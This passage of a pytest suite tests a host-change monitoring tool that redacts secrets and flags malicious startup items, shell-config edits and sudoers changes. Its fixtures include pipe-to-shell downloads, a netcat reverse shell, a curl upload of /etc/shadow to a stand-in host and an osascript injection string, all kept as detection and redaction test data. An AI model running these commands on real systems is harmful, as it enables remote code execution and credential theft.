# directory whose name merely starts with it (e.g. `…/since_backup`).
def test_big_file_scan_excludes_state_dir_not_siblings(monkeypatch, tmp_path):
    state = tmp_path / "since"
    state.mkdir()
    monkeypatch.setattr(since, "HOME", tmp_path)
    monkeypatch.setattr(since, "STATE_DIR", state)
    sib = tmp_path / "since_backup"
    sib.mkdir()
    (sib / "big.bin").write_bytes(b"\0" * (26 * 1024 * 1024))
    (state / "inside.bin").write_bytes(b"\0" * (26 * 1024 * 1024))
    files, _growing, _note = since.find_big_new_files(int(time.time()) - 600, min_mb=25)
    paths = [p for _, p in files]
    assert any("since_backup/big.bin" in p for p in paths), paths
    assert not any("inside.bin" in p for p in paths), paths


# v3 #1 (extension found while attacking the fix — NOT in the audit) — is_regular() bounds
# a path's TYPE but not its SIZE, and is racy on its own. A 2GB *sparse* plist costs an
# attacker nothing to plant and measured 4.1GB peak RSS through _mac_launch_items(); a
# symlink swapped to a FIFO right after the check re-opened the hang. safe_read_* closes
# both: O_NONBLOCK + S_ISREG on the FD, and a hard byte cap.
def test_safe_read_caps_huge_file(tmp_path):
    big = tmp_path / "big.bin"
    with open(big, "wb") as f:
        f.truncate(200 * 1024 * 1024)          # sparse: instant, ~0 disk
    data = since.safe_read_bytes(big, limit=64 * 1024)
    assert data is not None and len(data) == 64 * 1024


def test_safe_read_never_blocks_on_fifo_or_device(tmp_path):
    fifo = tmp_path / "f"
    os.mkfifo(fifo)
    dev = tmp_path / "z"
    os.symlink("/dev/zero", dev)
    with deadline():
        assert since.safe_read_bytes(fifo) is None
        assert since.safe_read_bytes(dev) is None
        assert since.safe_read_text(fifo) is None


def test_safe_read_is_toctou_safe(tmp_path):
    """The check happens on the FD we actually read, so winning the check-then-open race
    with a FIFO does not resurrect the hang."""
    real = tmp_path / "real"
    real.write_text("<plist/>")
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    link = tmp_path / "x.plist"
    os.symlink(real, link)
    assert since.is_regular(link)              # passes the cheap pre-check…
    os.remove(link)
    os.symlink(fifo, link)                     # …then the target is swapped under us
    with deadline():
        assert since.safe_read_bytes(link) is None


def test_safe_read_missing_and_dir(tmp_path):
    assert since.safe_read_bytes(tmp_path / "nope") is None
    assert since.safe_read_bytes(tmp_path) is None            # a directory is not readable
    ok = tmp_path / "ok"
    ok.write_text("hello")
    assert since.safe_read_text(ok) == "hello"


def test_safe_read_tail_starts_on_a_line_boundary(tmp_path):
    h = tmp_path / "hist"
    h.write_text("".join(f"cmd number {i}\n" for i in range(1000)))
    out = since.safe_read_text(h, limit=100, tail=True)
    assert out.startswith("cmd number ")        # no half-line fragment
    assert out.endswith("cmd number 999\n")     # and it really is the TAIL
    assert len(out) < 100


def test_history_is_bounded_and_recent(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    monkeypatch.setattr(since, "_HISTORY", None)
    monkeypatch.setattr(since, "MAX_READ", 4096)
    (tmp_path / ".zsh_history").write_text("".join(f"brew install pkg{i}\n" for i in range(5000)))
    hist = since.load_history()
    assert hist and hist[-1] == "brew install pkg4999"        # newest kept
    assert "brew install pkg0" not in hist                    # oldest dropped by the cap


# =========================================================================== #
# v0.4.4 — self-review findings (mutation-tested; see PENDING.md for repros).   #
# =========================================================================== #

# U1 (CRITICAL) — shell-quoting stops the SHELL, not the invoked program's option parser.
# `osascript` re-parsed the quoted login-item name as its own -e chunk and RAN it.
def test_login_item_hint_ends_option_parsing(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    evil = '-e property zz : (do shell script "touch /tmp/pwned")'
    hint = since.undo_hint("login_items", evil, None)
    assert "end run' -- " in hint, "no end-of-options guard: osascript will execute the name"
    assert hint.index(" -- ") > hint.index("end run"), "the -- must come after the script chunks"
    assert shlex.quote(evil) in hint          # still shell-safe too


@pytest.mark.parametrize("cat,key", [("npm_global", "-g"), ("pip", "--upgrade"),
                                     ("login_items", "-e evil")])
def test_hints_guard_leading_dash_values(monkeypatch, cat, key):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    hint = since.undo_hint(cat, key, None)
    assert " -- " in hint, f"{cat} hint would pass {key!r} to the program as an OPTION"


def test_linux_hints_guard_leading_dash(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "PLATFORM", "linux")
    monkeypatch.setattr(since, "HOME", tmp_path)
    for cat, key in [("launch_items", "-evil.service"), ("brew", "-evil"),
                     ("brew", "-evil (snap)"), ("login_items", "-evil.desktop")]:
        assert " -- " in since.undo_hint(cat, key, None), (cat, key)


# U2 — a cask key carries a ' (cask)' tag, so the emitted formula name did not exist.
def test_cask_undo_hint_names_a_real_formula(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    assert since.undo_hint("brew", "google-chrome (cask)", None) == \
        "brew uninstall --cask google-chrome"
    assert since.undo_hint("brew", "wget", None) == "brew uninstall wget"


# U3 — /Library/LaunchAgents is root-owned, so the unprivileged rm silently failed.
def test_library_launchagents_hint_uses_sudo(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    for d in ("/Library/LaunchAgents", "/Library/LaunchDaemons"):
        hint = since.undo_hint("launch_items", f"{d}/com.evil.plist", None)
        assert "sudo rm" in hint, d
    # a user-owned agent still needs no sudo
    assert "sudo" not in since.undo_hint(
        "launch_items", "~/Library/LaunchAgents/com.mine.plist", None)


# F1 (HIGH) — a *valid* plist with a non-dict root made plutil emit `["x"]`; `.get` on that
# raised, and because nothing isolates diff-time enrichment the whole digest died — saving no
# snapshot, so it recurred every day.
@pytest.mark.parametrize("body,label", [
    ("<array><string>hi</string></array>", "array root"),
    ("<dict><key>ProgramArguments</key><array><array><string>x</string></array></array></dict>",
     "nested ProgramArguments"),
    ("<dict><key>ProgramArguments</key><array><dict/></array></dict>", "dict in ProgramArguments"),
    ("<string>just a string</string>", "string root"),
])
def test_malformed_plist_does_not_crash(tmp_path, body, label):
    p = tmp_path / "com.evil.plist"
    p.write_text(f'<?xml version="1.0"?><!DOCTYPE plist><plist version="1.0">{body}</plist>')
    assert since.program_of_plist(str(p)) is None, label     # no exception, no bogus path


def test_trust_of_rejects_non_string_and_non_regular(tmp_path):
    for bad in ([1, 2], {"a": 1}, None, ""):
        assert since.trust_of(bad) == (None, False)
    fifo = tmp_path / "Evil.app"
    os.mkfifo(fifo)
    with deadline():                       # would block for codesign's full 10s timeout
        assert since.trust_of(str(fifo)) == (None, False)


def test_enrich_failure_degrades_one_finding_not_the_report(monkeypatch):
    # Patch the function actually ON the enrichment path (plist_program_and_argv). Patching
    # trust_of exercised nothing (it is only reached once a program resolves), and patching
    # program_of_plist stopped exercising anything when _enrich moved to the argv-aware call —
    # a test seam is only as good as its coupling to the real call graph.
    monkeypatch.setattr(since, "plist_program_and_argv",
                        lambda p: (_ for _ in ()).throw(RuntimeError("boom")))
    b = snap()
    c = snap(collectors={"launch_items": {"~/Library/LaunchAgents/x.plist": "1:a"}})
    findings = since.build_findings(b, c)   # must not raise
    f = next(x for x in findings if x["category"] == "launch_items")
    assert "enrichment failed" in (f["trust"] or ""), f
    assert f["level"] >= since.ORANGE, "the finding itself must still be reported"


# F6 — a wrong-type collector value in a baseline crashed the diff (safe_load only checks
# that `collectors` is a dict, not its values).
def test_wrong_type_collector_value_does_not_crash():
    b = snap()
    b["collectors"]["brew"] = ["not", "a", "dict"]
    c = snap(collectors={"login_items": {"a": "a"}})
    findings = since.build_findings(b, c)          # must not raise
    assert any(f["category"] == "login_items" for f in findings)


# F2 (HIGH) — difflib is quadratic on ~100 distinct repeated lines; MAX_READ bounded the READ
# but nothing bounded the DIFF (a planted 0.74MB rc file cost 32s of a real digest).
def test_huge_blob_diff_is_bounded_and_still_reported():
    a = "".join(f"line{i % 100}\n" for i in range(200_000))
    b_ = "".join(f"line{(i + 1) % 100}\n" for i in range(200_000))
    base, cur = snap(blobs={"~/.zshrc": a}), snap(blobs={"~/.zshrc": b_})
    t = time.time()
    findings = since.build_findings(base, cur)
    assert time.time() - t < 3.0, "quadratic diff is unbounded again"
    cf = [f for f in findings if f["category"] == "config"]
    assert cf and cf[0]["level"] >= since.ORANGE       # still reported, at the same severity
    assert "too large to diff" in cf[0]["diff"][0]


# F4 — the three state-dir reads that still blocked on a planted FIFO.
def test_state_dir_reads_never_block(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "STATE_DIR", tmp_path)
    monkeypatch.setattr(since, "SNAP_DIR", tmp_path / "snapshots")
    monkeypatch.setattr(since, "LABELS_FILE", tmp_path / "labels.json")
    monkeypatch.setattr(since, "IGNORE_FILE", tmp_path / "ignore.txt")
    (tmp_path / "snapshots").mkdir()
    os.mkfifo(tmp_path / "snapshots" / "a.json")
    os.mkfifo(tmp_path / "labels.json")
    os.mkfifo(tmp_path / "ignore.txt")
    with deadline():
        assert since.safe_load(tmp_path / "snapshots" / "a.json") is None
        assert since.load_labels() == {}
        assert since.load_ignores() == []


# The capability guard: a collector that could not run in ONE snapshot must not have its whole
# category reported as removed — that flood also pushed a REAL new install past the render cap.
def test_capability_guard_suppresses_phantom_removals():
    full = snap(collectors={"brew": {f"pkg{i}": "1" for i in range(50)}})
    full["tools"] = {"brew": "/opt/homebrew/bin/brew"}
    blind = snap(collectors={"brew": {}})
    blind["errors"] = {"brew": "not on PATH: brew"}
    blind["tools"] = {"brew": ""}
    assert since.unusable_cats(full, blind) == {"brew": "not on PATH: brew"}
    kept = since.build_findings(full, blind, skip_cats=tuple(since.unusable_cats(full, blind)))
    assert not [f for f in kept if f["category"] == "brew"], "phantom removals not suppressed"
    # control: without the guard they DO flood
    assert len([f for f in since.build_findings(full, blind) if f["category"] == "brew"]) == 50


def test_capability_guard_catches_a_different_tool_answering():
    a, b = snap(collectors={"pip": {"x": "1"}}), snap(collectors={"pip": {"y": "2"}})
    a["tools"] = {"pip": "/opt/homebrew/bin/pip3"}
    b["tools"] = {"pip": "/usr/bin/pip3"}          # same tool NAME, different binary
    assert "pip" in since.unusable_cats(a, b)
    a["tools"] = b["tools"] = {"pip": "/usr/bin/pip3"}
    assert "pip" not in since.unusable_cats(a, b)
    # fail CLOSED when a snapshot predates tool stamping
    c = snap(collectors={"pip": {"x": "1"}})
    c.pop("tools", None)
    assert "pip" in since.unusable_cats(c, b)


def test_tool_identity_is_stamped_in_snapshots():
    t = since.tool_identity()
    assert set(t) == set(since.CAT_TOOLS)
    assert all(isinstance(v, str) for v in t.values())


def test_need_raises_for_a_missing_tool():
    with pytest.raises(since.ToolUnavailable):
        since.need("definitely-not-a-real-binary-xyz")
    since.need("sh")          # present: must not raise


# F5 — blobs are stored verbatim in every snapshot; 13 files at the 8MB read cap meant ~9.6GB
# across KEEP_SNAPSHOTS. Capped, but a change past the cap must still be detected.
def test_blob_storage_is_capped_but_change_still_detected(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    monkeypatch.setattr(since, "PLATFORM", "macos")
    big = "x" * (since.BLOB_MAX * 2)
    (tmp_path / ".zshrc").write_text(big)
    first = since.text_sources()["~/.zshrc"]
    assert len(first) < since.BLOB_MAX + 200
    (tmp_path / ".zshrc").write_text(big[:-1] + "EVIL")     # change PAST the cap
    assert since.text_sources()["~/.zshrc"] != first


# Redaction: leaks that survived v0.4.3, and attacks v0.4.3 concealed. Both directions.
@pytest.mark.parametrize("line,secret", [
    ("+*/5 * * * * sshpass -p 'Tr0ub4dor&3' ssh a@h /x.sh", "Tr0ub4dor&3"),
    ("+mysqldump -uroot -pTr0ub4dor3 db", "Tr0ub4dor3"),
    ('+[url "https://aB3xYz9Qw2mN7pL1kJ4h@github.com/"]', "aB3xYz9Qw2mN7pL1kJ4h"),
    ("+export MYSQL_PWD=Tr0ub4dor3", "Tr0ub4dor3"),
    ('+oauth2-bearer = "aB3xYz9Qw2mN7pL1kJ4h"', "aB3xYz9Qw2mN7pL1kJ4h"),
    ('+header = "X-Auth: aB3xYz9Qw2mN7pL1kJ4h"', "aB3xYz9Qw2mN7pL1kJ4h"),
    ("+AuthorizedKeysCommand /usr/bin/fk --api-key=aB3xYz9Qw2mN7pL1", "aB3xYz9Qw2mN7pL1"),
    ("+export NOPASSWD_TOKEN=aB3xYz9Qw2mN7pL1kJ4h", "aB3xYz9Qw2mN7pL1kJ4h"),
    ("+deva ALL=(ALL) NOPASSWD: /usr/bin/sshpass -p Tr0ub4dor3 ssh root@x", "Tr0ub4dor3"),
    ("+export SSH_ASKPASS=hunter2Mixed", "hunter2Mixed"),   # non-path value under a path key
])
def test_v044_no_leak(line, secret):
    assert secret not in since.redact(line)


@pytest.mark.parametrize("line", [
    "+export SSH_AUTH_SOCK=/tmp/.evil/agent.sock",
    "+export SSH_ASKPASS=/tmp/steal.sh",
    "+export SUDO_ASKPASS=/tmp/steal.sh",
    "+export GIT_ASKPASS=/tmp/steal.sh",
    "+export PGPASSFILE=/tmp/evil.pgpass",
    "+export SSH_AUTH_SOCK=$XDG_RUNTIME_DIR/gcr/ssh",
    "+deva ALL=(ALL) PASSWD:NOEXEC: /tmp/miner",
    "+deva ALL=(ALL) PASSWD:SETENV: ALL",
    "+deva ALL=(ALL) PASSWD: ALL, !/usr/bin/su",
    "+PasswordAuthentication=yes",
    "+AuthorizedKeysFile=/tmp/evil/keys",
    "+ssh -p 2222 user@host",
    "+mkdir -p /tmp/x",
])
def test_v044_does_not_hide_the_attack(line):
    assert since.redact(line) == line


# Losing sight of a category is itself a security event: the capability guard correctly stops
# the phantom flood, but a passive `note:` would let an attacker buy SILENCE by breaking a
# collector's tool (neither the flood nor a note ever fired --notify).
def _cap_snap(brew, errors=None, tools=None):
    s = snap(collectors={"brew": brew})
    s["errors"] = errors or {}
    if tools is not None:
        s["tools"] = tools
    else:
        s.pop("tools", None)
    return s


def test_lost_coverage_is_ranked_and_would_notify():
    full = _cap_snap({f"pkg{i}": "1" for i in range(50)}, tools={"brew": "/opt/homebrew/bin/brew"})
    blind = _cap_snap({}, errors={"brew": "not on PATH: brew"}, tools={"brew": ""})
    unusable = since.unusable_cats(full, blind)
    lost = since.coverage_lost(full, blind, unusable)
    assert lost, "a working baseline losing its tool must count as lost coverage"
    findings = since.build_findings(full, blind, skip_cats=tuple(unusable), coverage=lost)
    assert not [f for f in findings if f["category"] == "brew"]        # no phantom flood
    cov = [f for f in findings if f["category"] == "coverage"]
    assert len(cov) == 1 and cov[0]["level"] == since.ORANGE
    assert since.max_level(findings) >= since.ORANGE, "must be loud enough to notify"
    out = since.render(findings, full, blind, [], [])
    assert "LOST VISIBILITY" in out and "Worth a look" in out


def test_benign_tool_stamp_transition_does_not_alarm():
    # a pre-v0.4.4 baseline has no tool stamp: skip the comparison, but do NOT cry wolf
    old = _cap_snap({f"pkg{i}": "1" for i in range(50)})
    new = _cap_snap({f"pkg{i}": "1" for i in range(50)}, tools={"brew": "/opt/homebrew/bin/brew"})
    unusable = since.unusable_cats(old, new)
    assert "brew" in unusable                                  # skipped (fail closed)
    assert since.coverage_lost(old, new, unusable) == {}        # but not an alarm
    findings = since.build_findings(old, new, skip_cats=tuple(unusable),
                                    coverage=since.coverage_lost(old, new, unusable))
    assert not [f for f in findings if f["category"] == "coverage"]


def test_tool_absent_in_both_snapshots_is_silent():
    a = _cap_snap({}, errors={"brew": "not on PATH: brew"}, tools={"brew": ""})
    b = _cap_snap({}, errors={"brew": "not on PATH: brew"}, tools={"brew": ""})
    assert since.unusable_cats(a, b) == {}          # nothing to compare either way
    assert since.coverage_lost(a, b, {}) == {}


def test_tool_swap_is_also_lost_coverage():
    """A planted shim (`~/.local/bin/brew`) changes the tool IDENTITY without erroring. The
    daily job's pinned PATH necessarily includes user-writable dirs, so this is the cheapest
    suppression route: it must rank and notify, not whisper a note."""
    good = _cap_snap({f"pkg{i}": "1" for i in range(50)}, tools={"brew": "/opt/homebrew/bin/brew"})
    shim = _cap_snap({f"pkg{i}": "1" for i in range(50)}, tools={"brew": "/home/u/.local/bin/brew"})
    unusable = since.unusable_cats(good, shim)
    lost = since.coverage_lost(good, shim, unusable)
    assert "brew" in lost, "a swapped tool bought the attacker silence"
    findings = since.build_findings(good, shim, skip_cats=tuple(unusable), coverage=lost)
    assert since.max_level(findings) >= since.ORANGE
    assert not [f for f in findings if f["category"] == "brew"]      # still no phantom flood


# =========================================================================== #
# Round 2 of the v0.4.4 self-review: regressions the fix batch itself created.  #
# =========================================================================== #

# PERF-1 (CRITICAL) — the `_show` tail rescan recursed once per credential-ish key on the line.
# A 2.5KB comment of repeated `_pwd ` (under _REDACT_MAX, so truncation did not help) raised
# RecursionError, which nothing catches: the digest died before saving a snapshot, so the planted
# line stayed "added" and every later run died identically — an unprivileged one-line kill switch.
@pytest.mark.parametrize("keyword", ["_pwd", "pass", "token", "_auth", "secret"])
def test_redact_survives_deeply_nested_keys(keyword):
    line = "+# " + f"{keyword} " * 900
    t = time.time()
    out = since.redact(line)            # must not raise RecursionError
    assert time.time() - t < 0.5, "the tail rescan is superlinear again"
    assert isinstance(out, str)


def test_redact_depth_cap_fails_safe():
    # at the cap it must REDACT, never recurse further and never show the tail unscanned
    line = "+" + "".join(f"pass{i}=x " for i in range(50)) + "MYSQL_PWD=hunter2Xyz9"
    assert "hunter2Xyz9" not in since.redact(line)


# LEAK-1 — "one whitespace token" is not "nothing follows": a shell chains with ; && |
@pytest.mark.parametrize("line,secret", [
    ("+export SSH_ASKPASS=/tmp/a.sh;MYSQL_PWD=hunter2Xyz9", "hunter2Xyz9"),
    ("+export SECRET_FILE=/etc/x/y&&TOKEN=aB3xYz9Qw2mN", "aB3xYz9Qw2mN"),
    ("+export PGPASSFILE=/tmp/p|GITHUB_TOKEN=aB3xYz9Qw2mN", "aB3xYz9Qw2mN"),
])
def test_chained_command_after_a_shown_path_is_scanned(line, secret):
    assert secret not in since.redact(line)


# LEAK-2 — a path-VALUED key needs a real path, not merely a '/'-, '~'- or '$'-leading value
# (a base64 secret starts with '/' ~1/64 of the time; every crypt hash starts with '$').
@pytest.mark.parametrize("line,secret", [
    ("+export SECRET_FILE=/hunter2Xyz9", "hunter2Xyz9"),
    ("+export TOKEN_PATH=~hunter2Xyz9", "hunter2Xyz9"),
    ("+export API_KEY_FILE=$hunter2Xyz9", "hunter2Xyz9"),
    ("+export CREDENTIALS_FILE=/hunter2Xyz9", "hunter2Xyz9"),
])
def test_path_valued_key_needs_a_real_path(line, secret):
    assert secret not in since.redact(line)


@pytest.mark.parametrize("line", [
    "+export SSH_ASKPASS=/tmp/steal.sh",
    "+export SSH_AUTH_SOCK=/tmp/.evil/agent.sock",
    "+export PGPASSFILE=$HOME/.pgpass",
    "+export SSH_ASKPASS=~/.local/bin/x.sh",
    "+export SSH_ASKPASS=./steal.sh",
])
def test_real_paths_are_still_shown(line):
    assert since.redact(line) == line


# LEAK-3 / HIDE-1 — the sudoers gate checked only the FIRST element and then exempted the whole
# remainder; and routing the carve-out through the rescan redacted the granted command list,
# which is the payload of a sudoers diff.
def test_sudoers_comma_list_is_validated():
    assert "hunter2Xyz9" not in since.redact("+deva ALL=(ALL) PASSWD: ALL,hunter2Xyz9")


@pytest.mark.parametrize("line", [
    "+deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
    "+deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
])
def test_command_specs_stay_intact(line):
    """Which account is reset, which host is contacted — the whole point of the diff."""
    assert since.redact(line) == line


# #2 — my own guard was the first code to read the BASELINE's errors/tools, without validating
# their type: the same crash class this release already fixed twice.
@pytest.mark.parametrize("field,value", [
    ("tools", ["/opt/homebrew/bin/brew"]), ("tools", "nope"), ("tools", 7),
    ("errors", 5), ("errors", ["brew"]), ("errors", "brew"),
])
def test_wrong_typed_guard_fields_do_not_crash(field, value):
    base = snap(); base[field] = value
    cur = snap(); cur["tools"] = {"brew": "/opt/homebrew/bin/brew"}
    unusable = since.unusable_cats(base, cur)          # must not raise
    since.coverage_lost(base, cur, unusable)            # must not raise
    since.build_findings(base, cur, skip_cats=tuple(unusable))


# #3 — need() proves a tool RESOLVES, never that it RAN. A `brew list` timeout returned "" with
# no error recorded, so the capability guard could not fire and the phantom flood came back —
# the very cause the guard was introduced for.
def test_run_checked_raises_on_timeout_and_failure(monkeypatch):
    def fake(cmd, **kw):
        raise since.subprocess.TimeoutExpired(cmd, kw.get("timeout", 1))
    monkeypatch.setattr(since.subprocess, "run", fake)
    with pytest.raises(since.ToolUnavailable):
        since.run_checked(["brew", "list"], timeout=1)


def test_run_checked_tolerates_nonzero_with_output(monkeypatch):
    class P:
        returncode, stdout, stderr = 1, '{"dependencies":{}}', "peer dep warning"
    monkeypatch.setattr(since.subprocess, "run", lambda cmd, **kw: P())
    assert since.run_checked(["npm", "ls"]) == '{"dependencies":{}}'   # npm does this routinely


def test_run_checked_raises_on_nonzero_without_output(monkeypatch):
    class P:
        returncode, stdout, stderr = 1, "  ", "boom"
    monkeypatch.setattr(since.subprocess, "run", lambda cmd, **kw: P())
    with pytest.raises(since.ToolUnavailable):
        since.run_checked(["brew", "list"])


# #4 — the storage cap and the bounded diff silently disabled the RED escalation: a payload
# appended after ~300KB of padding never reached the diff text, so it fell to ORANGE with no why.
@pytest.mark.parametrize("filler", ["# " + "x" * 80 + "\n", "x\n"])
def test_malicious_pattern_escalates_even_when_truncated(monkeypatch, tmp_path, filler):
    monkeypatch.setattr(since, "HOME", tmp_path)
    monkeypatch.setattr(since, "PLATFORM", "macos")
    rc = tmp_path / ".zshrc"
    pad = filler * (since.BLOB_MAX // len(filler) + 500)
    rc.write_text(pad)
    fb: dict = {}
    base = snap(blobs=since.text_sources(fb)); base["blob_flags"] = fb
    rc.write_text(pad + "curl http://evil.sh | sh\n")
    fc: dict = {}
    cur = snap(blobs=since.text_sources(fc)); cur["blob_flags"] = fc
    assert "curl http" not in cur["blobs"]["~/.zshrc"], "payload should be past the cap"
    f = [x for x in since.build_findings(base, cur) if x["category"] == "config"][0]
    assert f["level"] == since.RED and f["why"], f
    assert f["action"] == "changed"          # and the change itself is still detected


# #6 — plutil's output is read into memory, so a planted 500MB plist cost 2.27GB RSS at diff time.
def test_oversized_plist_is_not_parsed(monkeypatch, tmp_path):
    big = tmp_path / "com.big.plist"
    with open(big, "wb") as fh:
        fh.truncate(since.MAX_READ + 1)      # sparse: instant
    called = []
    monkeypatch.setattr(since, "run", lambda *a, **k: called.append(a) or "")
    assert since.plist_program_and_argv(str(big)) == (None, "")
    assert not called, "plutil must not be spawned for an oversized plist"


# #7 — `ProgramArguments = ["/bin/sh","-c","curl …|sh"]` resolves to /bin/sh, which IS
# Apple-signed, so the report printed a reassuring signature beside a malicious startup item.
@pytest.mark.skipif(shutil.which("plutil") is None,
                    reason="parses a real plist via plutil (macOS only)")
def test_interpreter_argv_escalates_over_its_signature(tmp_path):
    pl = tmp_path / "com.evil.plist"
    pl.write_text('<?xml version="1.0"?><!DOCTYPE plist><plist version="1.0"><dict>'
                  '<key>ProgramArguments</key><array><string>/bin/sh</string>'
                  '<string>-c</string><string>curl -s http://evil.example/x|sh</string>'
                  '</array></dict></plist>')
    prog, argv = since.plist_program_and_argv(str(pl))
    assert prog == "/bin/sh" and "curl" in argv
    f = {"category": "launch_items", "action": "added", "key": str(pl), "value": "x",
         "level": since.ORANGE, "label": "startup job", "trust": None, "why": None, "undo": None}
    since._enrich(f, {})
    assert f["level"] == since.RED and f["why"], f
    # the classic hijack: an EXISTING plist overwritten was YELLOW with no trust check at all
    g = dict(f, action="changed", level=since.YELLOW, why=None, trust=None, value=("a", "b"))
    since._enrich(g, {})
    assert g["level"] == since.RED and g["why"]


# #1 — a skipped category must not silently become its own baseline: the install made during the
# blind window was otherwise never reported by any run, while the report said "Nothing changed".
def test_recover_baselines_walks_back_to_a_usable_snapshot(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
    def write(name, pkgs, tool="/opt/homebrew/bin/brew", err=None):
        s = snap(collectors={"brew": pkgs})
        s["tools"] = {"brew": tool}
        s["errors"] = err or {}
        (tmp_path / name).write_text(json.dumps(s))
        return s
    day1 = write("20260101T000000-1.json", {"jq": "1.7"})
    write("20260102T000000-2.json", {}, tool="", err={"brew": "not on PATH: brew"})  # blind day
    day3 = snap(collectors={"brew": {"jq": "1.7", "evilminer": "1.0"}})
    day3["tools"] = {"brew": "/opt/homebrew/bin/brew"}
    rec = since.recover_baselines(day3, {"brew": "was blind"})
    assert "brew" in rec and rec["brew"]["collectors"]["brew"] == day1["collectors"]["brew"]
    found = since.build_findings(rec["brew"], day3, skip_blobs=True,
                                 skip_cats=tuple(k for k in since.CAT if k != "brew"))
    assert any(f["key"] == "evilminer" for f in found), "the install must surface once brew works"


def test_recover_baselines_requires_the_same_tool(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
    s = snap(collectors={"brew": {"jq": "1.7"}})
    s["tools"] = {"brew": "/usr/local/bin/brew"}          # a DIFFERENT brew
    (tmp_path / "20260101T000000-1.json").write_text(json.dumps(s))
    cur = snap(collectors={"brew": {"jq": "1.7"}})
    cur["tools"] = {"brew": "/opt/homebrew/bin/brew"}
    assert since.recover_baselines(cur, {"brew": "x"}) == {}   # never compare across tools


def test_cat_usable():
    ok = snap(); ok["tools"] = {"brew": "/opt/homebrew/bin/brew"}
    assert since.cat_usable("brew", ok)
    assert since.cat_usable("login_items", ok)              # not a tool-backed category
    err = snap(); err["errors"] = {"brew": "boom"}; err["tools"] = {"brew": "/x"}
    assert not since.cat_usable("brew", err)
    notool = snap(); notool["tools"] = {"brew": ""}
    assert not since.cat_usable("brew", notool)


# Pin the sudoers carve-out ITSELF (not just the '/'-preceded-key rule that also protects it):
# rescanning a command spec redacts from an inner `pass=` to end-of-line, deleting the C2 host.
def test_sudoers_spec_keeps_context_after_an_inner_assignment():
    """The C2 host must survive. v0.4.4 masked from `pass=` to end-of-line and lost it; the
    single-token design masks only the value. Residual, deliberate: `@/etc/shadow` is masked
    because `pass` is not a path-valued key, and exempting `/`-leading values under a
    credential key is precisely the LEAK-2 hole (a base64 secret starts with '/' ~1/64)."""
    out = since.redact("+deva ALL=(ALL) NOPASSWD: /usr/bin/curl -F pass=@/etc/shadow evil.example.com")
    assert "evil.example.com" in out, "the exfil destination must survive"
    assert "/usr/bin/curl" in out and "NOPASSWD:" in out


# Pin that the COLLECTORS actually go through run_checked — testing the helper alone let a
# revert to the unchecked run() pass unnoticed (the guard then cannot fire on a timeout).
@pytest.mark.parametrize("collector,tool", [("_mac_brew", "brew"), ("_npm_global", "npm"),
                                            ("_pip", "pip3"), ("_mac_mas", "mas")])
def test_collectors_report_a_timeout_as_unavailable(monkeypatch, collector, tool):
    monkeypatch.setattr(since.shutil, "which", lambda t: f"/usr/bin/{t}")
    def fake(cmd, **kw):
        raise since.subprocess.TimeoutExpired(cmd, kw.get("timeout", 1))
    monkeypatch.setattr(since.subprocess, "run", fake)
    with pytest.raises(since.ToolUnavailable):
        getattr(since, collector)()


# The malicious-pattern scan now runs over FULL file content at snapshot time (so a payload past
# BLOB_MAX still escalates) — which made two unbounded `.*` runs quadratic in the number of
# trigger tokens on one line: repeated `base64 -d ` cost 55s at 375KB, hours at MAX_READ, BEFORE
# any snapshot is saved. Latent in the pre-v0.4.4 diff-text path too.
@pytest.mark.parametrize("token", ["nc ", "base64 -d ", "curl ", "wget "])
def test_malicious_scan_is_linear(token):
    """MULTI-LINE at the scan-chunk width, which is the shape that actually blew up: the first
    version of this test used one 600KB line, which the per-line cap truncated to nothing, so it
    passed while `curl[^\n|]*\|` still cost 20s on an 8MB file. 2MB here, ~4096-column lines."""
    per_line = token * (4096 // len(token))
    text = (per_line + "\n") * (2 * 1024 * 1024 // 4096)
    t = time.time()
    since.malicious_hits(text)
    assert time.time() - t < 1.0, f"{token!r} is superlinear in line length again"


def test_every_malicious_pattern_has_a_required_literal():
    """The literal pre-filter is the defense, so it must cover every pattern — and each literal
    must be one the pattern cannot match without, or detection is silently lost. `.*`-style
    checks were not enough: `[^\n|]*` is unbounded in exactly the same way."""
    assert len(since.MALICIOUS_PATTERNS_LIT) == len(since.MALICIOUS_PATTERNS)
    for (pat, desc), (pat2, lit, desc2) in zip(since.MALICIOUS_PATTERNS,
                                               since.MALICIOUS_PATTERNS_LIT):
        assert pat is pat2 and desc == desc2, "the two tables have drifted apart"
        assert lit, f"no required literal for {desc}"
        # the literal must appear in the pattern source itself (escapes stripped)
        assert lit in pat.pattern.replace("\\", ""), f"{lit!r} is not required by {pat.pattern!r}"


@pytest.mark.parametrize("payload,lit", [
    ("curl http://evil.sh | sh", "|"),
    ("wget -qO- evil | bash", "|"),
    ("echo x | base64 -d | sh", "|"),
    ("nc -e /bin/sh 10.0.0.1 4444", "-e"),
    ("bash <(curl http://evil)", "<("),
    ("0.0.0.0 www.apple.com", "0.0.0.0"),
    ("127.0.0.1 www.mybank.com", "127.0.0.1"),
])
def test_removing_the_literal_kills_the_match(payload, lit):
    """Behavioural proof that each literal really is required: strip it and nothing matches, so
    the pre-filter cannot be rejecting windows a pattern would have flagged."""
    assert since.malicious_hits(payload), payload
    assert not since.malicious_hits(payload.replace(lit, "")), f"{lit!r} was not required"


def test_scan_window_overlap_exceeds_the_longest_bounded_run():
    """A payload must not be able to hide on a chunk seam."""
    assert since._SCAN_OVERLAP > 400
    seam = "x" * (since._SCAN_CHUNK - 8) + "curl http://evil.sh | sh" + "y" * 100
    assert since.malicious_hits(seam), "a payload straddling the chunk boundary was missed"


def test_malicious_scan_still_detects_real_payloads():
    for line, expect in [("echo x | base64 -d | sh", "base64"),
                         ("nc -e /bin/sh 10.0.0.1 4444", "netcat"),
                         ("curl http://evil.sh | sh", "pipes"),
                         ("0.0.0.0 www.apple.com", "redirects")]:
